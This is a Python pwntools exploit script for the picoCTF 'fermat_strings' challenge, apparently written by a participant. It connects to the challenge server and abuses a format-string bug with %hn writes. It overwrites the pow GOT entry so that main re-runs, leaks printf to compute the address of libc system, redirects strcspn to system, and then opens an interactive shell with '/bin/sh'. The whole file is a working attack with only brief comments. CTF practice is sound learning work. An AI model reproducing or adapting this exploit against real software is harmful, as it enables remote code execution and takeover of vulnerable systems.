from pwn import *

#target = process('./fermat_strings')

#pid = gdb.attach(target, "\nb *main+416\ncontinue")

target = remote('mars.picoctf.net', 31929)

elf = ELF("fermat_strings")
libc = ELF("libc6_2.31-0ubuntu9.1_amd64.so")

#Gadgets:
pow_got_plt = p64(0x601040)
main = 0x00400837
printf_got_plt = p64(0x601030)
puts_got_plt = p64(0x601018)
setbuf_got_plt = p64(0x601028)
snprintf_got_plt = p64(0x601038)
strcspn_got_plt = p64(0x601048)
strcspn_got_plt2 = p64(0x601048 + 2)
read_got_plt = p64(0x601050) #read brings it down to two options
atoi_got_plt = p64(0x601058)

print(target.recvuntil(b'A:'))
#I have to load the location here because nulls.
payload = b'12345678' + pow_got_plt

target.sendline(payload)

print(target.recvuntil(b'B:'))

#This one will set me up to reroll main forever.
payload = b'12' + b'%2063x%11$hn'

target.sendline(payload)


print(target.recvuntil(b'and B:'))
print(target.recv(20))

print(target.recvuntil(b'A:'))

payload = b'12345678' + printf_got_plt

target.sendline(payload)
print(target.recvuntil(b'B:'))
payload = b'12' + b'%11$s'
target.sendline(payload)
print(target.recvuntil(b'B: 12'))
leak = target.recv(6)
printf_libc = u64(leak + b'\x00' * 2)
libc_base = printf_libc - libc.symbols['printf']

system_libc = libc_base + libc.symbols['system']
print('printf libc is: ', hex(printf_libc))
print('system libc should be: ', hex(system_libc))


#Now we do the final overwrite with our libc leak.
print(target.recvuntil(b'A:'))

payload = b'12345678' + strcspn_got_plt

target.sendline(payload)

print(target.recvuntil(b'B:'))

#So now we have to carefully, programmatically refine our payload
print('system libc should be: ', hex(system_libc))
system_last_bytes = system_libc & 0xffff
print('system last bytes: ', hex(system_last_bytes), system_last_bytes)
system_next_bytes = (system_libc & 0xffff0000) // 0x10000
print('system next bytes: ', hex(system_next_bytes), system_next_bytes)
print(str(system_last_bytes).encode('ascii'))

#These are determined by using got command in gdb to check how it's looking
part1 = b'%' + str(system_last_bytes - 0x28).encode('ascii') + b'x%11$hn'
print(part1)

part2 = b'%' + str(0x10000 + system_next_bytes - system_last_bytes - 1).encode('ascii') + b'x%46$hn'
print(part2)
#The bits of padding are important since I'm referencing an address at the very end of the payload, so length until then must remain constant.
payload = b'12' + part1 + b'a' * (14 - len(part1)) + part2 + b'a' * (16 - len(part2)) + strcspn_got_plt2
target.sendline(payload)
print(target.recvuntil(b'A:'))

#This effectively calls system('/bin/sh')
target.sendline(b'/bin/sh')
print(target.recvuntil(b'B:'))
target.sendline(b'/bin/sh')

target.interactive()
